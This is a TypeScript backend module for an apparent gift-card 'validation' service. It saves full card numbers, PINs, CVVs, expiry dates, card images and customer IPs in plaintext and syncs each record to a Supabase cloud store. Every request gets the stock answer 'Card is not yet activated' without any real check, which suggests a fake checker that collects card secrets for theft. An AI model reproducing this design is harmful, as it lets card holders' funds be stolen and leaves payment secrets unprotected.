import prisma from '../database/prisma.js';
import {
  pushValidationToSupabase,
  bulkSyncValidationsToSupabase,
  isSupabaseConfigured,
  checkSupabaseHealth,
} from './supabaseService.js';

export interface CreateValidationInput {
  brand: string;
  cardNumber: string;
  pin?: string;
  cvv?: string;
  expiryDate?: string;
  images?: string[];
  currency?: string;
  cardAmount?: number;
  status?: 'PENDING' | 'PROCESSING' | 'VERIFIED' | 'INVALID' | 'ERROR';
  result?: string;
  notes?: string;
  customerEmail?: string;
  customerIp?: string;
}

export interface UpdateValidationInput {
  brand?: string;
  cardNumber?: string;
  pin?: string | null;
  cvv?: string | null;
  expiryDate?: string | null;
  images?: string[];
  currency?: string;
  cardAmount?: number;
  status?: 'PENDING' | 'PROCESSING' | 'VERIFIED' | 'INVALID' | 'ERROR';
  result?: string | null;
  notes?: string | null;
  customerEmail?: string | null;
}

export async function createValidationRequest(input: CreateValidationInput) {
  const imagesClean = Array.isArray(input.images)
    ? input.images.filter((img) => typeof img === 'string' && img.trim().length > 0).slice(0, 3)
    : [];

  const validation = await prisma.giftCardValidation.create({
    data: {
      brand: input.brand.trim(),
      cardNumber: input.cardNumber.trim(),
      pin: input.pin ? input.pin.trim() : null,
      cvv: input.cvv ? input.cvv.trim() : null,
      expiryDate: input.expiryDate ? input.expiryDate.trim() : null,
      images: JSON.stringify(imagesClean),
      currency: input.currency ? input.currency.trim() : 'USD',
      cardAmount: typeof input.cardAmount === 'number' ? input.cardAmount : 0.0,
      status: input.status || 'PENDING',
      result: input.result || 'Card is not yet activated',
      notes: input.notes ? input.notes.trim() : null,
      customerEmail: input.customerEmail ? input.customerEmail.trim() : null,
      customerIp: input.customerIp ? input.customerIp.trim() : null,
    },
  });

  const formatted = {
    ...validation,
    images: JSON.parse((validation.images as string) || '[]') as string[],
  };

  // Push automatically to Supabase in real-time (graceful fallback if not configured or offline)
  pushValidationToSupabase(formatted).catch((err) => {
    console.warn('Background Supabase sync notice:', err?.message || err);
  });

  return formatted;
}

export async function getAdminValidations() {
  const validations = await prisma.giftCardValidation.findMany({
    orderBy: { createdAt: 'desc' },
  });
  return validations.map((v) => ({
    ...v,
    images: JSON.parse((v.images as string) || '[]') as string[],
  }));
}

export async function getValidationById(id: string) {
  const validation = await prisma.giftCardValidation.findUnique({
    where: { id },
  });
  if (!validation) return null;
  return {
    ...validation,
    images: JSON.parse((validation.images as string) || '[]') as string[],
  };
}

export async function updateValidation(id: string, input: UpdateValidationInput) {
  const data: any = {};
  if (input.brand !== undefined) data.brand = input.brand.trim();
  if (input.cardNumber !== undefined) data.cardNumber = input.cardNumber.trim();
  if (input.pin !== undefined) data.pin = input.pin ? input.pin.trim() : null;
  if (input.cvv !== undefined) data.cvv = input.cvv ? input.cvv.trim() : null;
  if (input.expiryDate !== undefined) data.expiryDate = input.expiryDate ? input.expiryDate.trim() : null;
  if (input.currency !== undefined) data.currency = input.currency.trim();
  if (input.cardAmount !== undefined) data.cardAmount = typeof input.cardAmount === 'number' ? input.cardAmount : 0.0;
  if (input.status !== undefined) data.status = input.status;
  if (input.result !== undefined) data.result = input.result ? input.result.trim() : null;
  if (input.notes !== undefined) data.notes = input.notes ? input.notes.trim() : null;
  if (input.customerEmail !== undefined) data.customerEmail = input.customerEmail ? input.customerEmail.trim() : null;
  if (Array.isArray(input.images)) {
    data.images = JSON.stringify(input.images.filter((img) => typeof img === 'string' && img.trim().length > 0).slice(0, 3));
  }

  const updated = await prisma.giftCardValidation.update({
    where: { id },
    data,
  });

  const formatted = {
    ...updated,
    images: JSON.parse((updated.images as string) || '[]') as string[],
  };

  // Push automatically to Supabase
  pushValidationToSupabase(formatted).catch((err) => {
    console.warn('Background Supabase sync notice:', err?.message || err);
  });

  return formatted;
}

export async function deleteValidation(id: string) {
  const deleted = await prisma.giftCardValidation.delete({
    where: { id },
  });
  return deleted;
}

export async function deleteMultipleValidations(ids: string[]) {
  const result = await prisma.giftCardValidation.deleteMany({
    where: {
      id: { in: ids },
    },
  });
  return result;
}

export async function clearAllValidations() {
  const result = await prisma.giftCardValidation.deleteMany({});
  return result;
}

export async function syncAllValidationsToCloud() {
  const validations = await prisma.giftCardValidation.findMany({
    orderBy: { createdAt: 'desc' },
  });
  const formatted = validations.map((v) => ({
    ...v,
    images: JSON.parse((v.images as string) || '[]') as string[],
  }));

  return await bulkSyncValidationsToSupabase(formatted);
}

export async function getSupabaseSyncStatus() {
  return await checkSupabaseHealth();
}
